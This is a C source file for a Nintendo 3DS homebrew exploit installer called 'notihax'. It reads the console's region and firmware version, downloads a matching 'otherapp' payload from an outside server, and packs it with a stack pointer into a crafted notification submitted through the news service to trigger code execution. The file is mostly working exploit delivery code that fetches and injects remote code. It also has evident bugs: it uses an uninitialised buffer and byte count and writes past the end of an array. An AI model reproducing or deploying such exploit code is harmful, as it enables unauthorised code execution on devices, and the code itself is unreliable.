#include <3ds.h>


char regionids_table[7][4] = {//http://3dbrew.org/wiki/Nandrw/sys/SecureInfo_A
"JPN",
"USA",
"EUR",
"JPN", //"AUS"
"CHN",
"KOR",
"TWN"
};

// Code from examples/3ds/http/source/main.c
Result http_download(httpcContext *context, u8* out, u32* bytes_downloaded)
{
	Result ret=0;
	u8* framebuf_top;
	u32 statuscode=0;
	u32 contentsize=0;

    printf("Beginning request...\n");
	ret = httpcBeginRequest(context);
	if(ret!=0)return ret;

    printf("Retrieving status code...\n");
	ret = httpcGetResponseStatusCode(&context, &statuscode, 0);
	if(R_FAILED(ret))return ret;

    printf("Retreived status code ...\n");
	if(statuscode!=200)return statuscode;

    printf("Preparing to download data...\n");
	ret=httpcGetDownloadSizeState(context, NULL, &contentsize);
	if(R_FAILED(ret))return ret;

	gfxFlushBuffers();

	memset(out, 0, contentsize);

    printf("Downloading data...\n");
	ret = httpcDownloadData(context, out, contentsize, NULL);
	if(ret!=0)
	{
		return ret;
	}

	return 0;
}

int main(int argc, char** argv)
{
    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);
    aptInit();
    httpcInit(0);

    printf("Ready to install notihax! Press A to install, press any other key to exit.\n\n");

    while(aptMainLoop())
    {
        hidScanInput();

        if(hidKeysDown())
        {
            if(hidKeysDown() & KEY_A) {
                break;
            } else {
                return 0;
            }
        }
    }

	Result ret = 0;
	u8 region=0;
	u8 new3dsflag = 0;

	OS_VersionBin nver_versionbin;
	OS_VersionBin cver_versionbin;

	u32 payloadsize = 0, payloadsize_aligned = 0;
	u32 payload_src = 0;

	char payload_sysver[32];
	char payloadurl[0x80];
	char payload_sdpath[0x80];

	memset(&nver_versionbin, 0, sizeof(OS_VersionBin));
	memset(&cver_versionbin, 0, sizeof(OS_VersionBin));

	memset(payload_sysver, 0, sizeof(payload_sysver));
	memset(payloadurl, 0, sizeof(payloadurl));
	memset(payload_sdpath, 0, sizeof(payload_sdpath));

	printf("Getting system-version/system-info etc...\n");

	ret = cfguInit();
	if(ret!=0)
	{
		printf("Failed to init cfgu: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}
	ret = CFGU_SecureInfoGetRegion(&region);
	if(ret!=0)
	{
		printf("Failed to get region from cfgu: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}
	if(region>=7)
	{
		printf("Region value from cfgu is invalid: 0x%02x.\n", (unsigned int)region);
		ret = -9;
		return ret;
	}
	cfguExit();

	APT_CheckNew3DS(&new3dsflag);

	ret = osGetSystemVersionData(&nver_versionbin, &cver_versionbin);
	if(ret!=0)
	{
		printf("Failed to load the system-version: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}

	snprintf(payload_sysver, sizeof(payload_sysver)-1, "%s-%d-%d-%d-%d-%s", new3dsflag?"NEW":"OLD", cver_versionbin.mainver, cver_versionbin.minor, cver_versionbin.build, nver_versionbin.mainver, regionids_table[region]);
	snprintf(payloadurl, sizeof(payloadurl)-1, "http://smea.mtheall.com/get_payload.php?version=%s", payload_sysver);
	snprintf(payload_sdpath, sizeof(payload_sdpath)-1, "sdmc:/hblauncherloader_otherapp_payload_%s.bin", payload_sysver);

    printf("\nDownloading payload...\n");

    httpcContext context;
    httpcOpenContext(&context, HTTPC_METHOD_GET, payloadurl, 1);

    u32 bytes;
    u8* buffer;
    u32 i;
    switch((i = http_download(&context, buffer, &bytes)))
    {
    case 0:
        break;
    default:
        printf("%u: %s", i, payloadurl);
        return i;
    }

    printf("Building haxxed notification...\n");

    u8 title_payload[bytes + 4];

    for(int i = 0; i < bytes; i++)
    {
        title_payload[i] = buffer[i];
    }

    printf("Attaching stack pointer...\n");
    title_payload[bytes + 1] = (u8) ((((u32) buffer) >> 24) & 0xFF);
    title_payload[bytes + 2] = (u8) ((((u32) buffer) >> 16) & 0xFF);
    title_payload[bytes + 3] = (u8) ((((u32) buffer) >> 8 ) & 0xFF);
    title_payload[bytes + 4] = (u8) ((((u32) buffer)      ) & 0xFF);

    printf("Submitting haxxed notification...\n");
    newsInit();
    NEWS_AddNotification((u16*)&title_payload, bytes, (u16*)&title_payload, bytes, (u16*)&title_payload, bytes, false);

    printf("Injected haxxed notification!\n");

    while(aptMainLoop())
    {
        hidScanInput();

        if(hidKeysDown())
        {
            break;
        }
    }

    aptExit();
    httpcExit();
	gfxExit();
    newsExit();
}
